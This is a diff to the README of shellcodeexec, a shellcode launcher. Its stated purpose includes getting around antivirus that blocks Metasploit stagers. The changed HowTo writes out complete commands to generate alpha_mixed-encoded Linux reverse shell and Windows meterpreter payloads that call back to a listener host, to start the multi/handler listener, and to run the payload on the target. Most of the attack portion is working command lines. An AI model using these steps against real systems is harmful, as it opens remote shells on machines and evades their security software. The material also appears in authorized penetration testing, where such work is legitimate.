@@ -10,7 +10,7 @@ Most of the shellcode launchers out there, including proof of concepts part of m
 
 = Description =
 
-This script and the relevant project files (Makefile and Visual Studio files) allow you to compile the tool once easily then run your shellcode across different architectures and operating systems.
+This script and the relevant project files (Makefile and Visual Studio files) allow you to compile the tool once then run your shellcode across different architectures and operating systems.
 
 Moreover, it solves a common real world issue: the target system's anti virus software blocking a Metasploit-generated payload stager (either EXE of ELF). Take for instance the following command line:
 
@@ -35,21 +35,35 @@ shellcodeexec:
 
 * Works in DEP/NX-enabled environments: it allocates the memory page where it stores the shellcode as +rwx - Readable Writable and eXecutable.
 
-* It supports alphanumeric encoded payloads: you can pipe your binary-encoded shellcode to Metasploit's msfencode to encode it with the alpha_mixed encoder. Use the BufferRegister variable to set the registry where the address in memory of the shellcode is stored, to avoid get_pc() binary stub to be prepended to the shellcode.
+* It supports alphanumeric encoded payloads: you can pipe your binary-encoded shellcode (generated for instance with Metasploit's msfpayload) to Metasploit's msfencode to encode it with the alpha_mixed encoder. Set the BufferRegister variable to EAX registry where the address in memory of the shellcode will be stored, to avoid get_pc() binary stub to be prepended to the shellcode.
 
 * Spawns a new thread where the shellcode is executed in a structure exception handler (SEH) so that if you wrap shellcodeexec into your own executable, it avoids the whole process to crash in case of unexpected behaviours.
 
 
 = HowTo =
 
-1. Generate a Metasploit shellcode and encode it with the alphanumeric encoder. For example:
+1. Generate a Metasploit shellcode and encode it with the alphanumeric encoder. For example for a Linux target:
 
     $ msfpayload linux/x86/shell_reverse_tcp EXITFUNC=thread LPORT=4444 LHOST=192.168.136.1 R | msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX
 
-2. Execute the Metasploit multi/handler listener on your machine. For example:
+   Or for a Windows target:
+
+    $ msfpayload windows/meterpreter/reverse_tcp EXITFUNC=thread LPORT=4444 LHOST=192.168.136.1 R | msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX
+
+
+2. Execute the Metasploit multi/handler listener on your machine. For example for a Linux target:
 
     $ msfcli multi/handler PAYLOAD=linux/x86/shell_reverse_tcp EXITFUNC=thread LPORT=4444 LHOST=192.168.136.1 E
 
-3. On the target system, execute the alphanumeric-encoded shellcode with this tool:
+   Or for a Windows target:
+
+    $ msfcli multi/handler PAYLOAD=windows/meterpreter/reverse_tcp EXITFUNC=thread LPORT=4444 LHOST=192.168.136.1 E
+
+
+3. Execute the alphanumeric-encoded shellcode with this tool. For example on the Linux target:
 
     $ ./shellcodeexec <msfencode's alphanumeric-encoded payload>
+
+   Or, on the Windows target:
+
+    C:\WINDOWS\Temp>shellcodeexec.exe <msfencode's alphanumeric-encoded payload>
